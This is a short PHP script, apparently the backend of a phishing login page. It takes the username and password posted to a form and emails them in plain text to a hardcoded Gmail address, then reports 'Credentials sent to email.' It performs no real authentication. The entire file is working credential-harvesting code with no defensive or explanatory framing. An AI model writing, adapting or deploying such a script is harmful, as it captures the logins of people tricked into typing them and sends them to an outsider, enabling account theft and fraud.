<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $to = "aadhyacreation29@gmail.com"; // Replace with your email
    $subject = "Login Credentials";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: aadhyacreation29@gmail.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Credentials sent to email.";
    } else {
        echo "Failed to send email.";
    }
}
?>
